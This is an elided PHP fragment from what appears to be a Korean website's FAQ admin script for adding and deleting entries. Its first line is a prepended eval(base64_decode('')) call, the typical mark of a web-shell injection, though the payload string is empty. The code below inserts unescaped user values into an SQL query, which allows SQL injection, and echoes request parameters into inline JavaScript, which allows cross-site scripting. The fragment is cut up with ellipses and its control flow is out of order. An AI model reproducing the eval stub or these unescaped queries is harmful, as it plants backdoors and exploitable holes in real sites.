<?php eval(base64_decode('')); ?><?
	...
	if ($mode == "add") {
		...
		$query = "insert into tb_faq (title, faq, regdate) values 
				  ('$title', '$faq', now())";
		...
		echo "<script language=\"javascript\">\n
			alert('등록 되었습니다.');
			parent.frames[3].location = 'faq_list.php';
			</script>";
		exit;
		...
		mysql_query($query) or die("Query Error tb_faq");
		...
		echo "<script language=\"javascript\">\n
			alert('삭제 되었습니다.');
			parent.frames[3].location = 'faq_list.php?page=$page&qry_str=$qry_str&idxfield=$idxfield';
			</script>";
		exit;
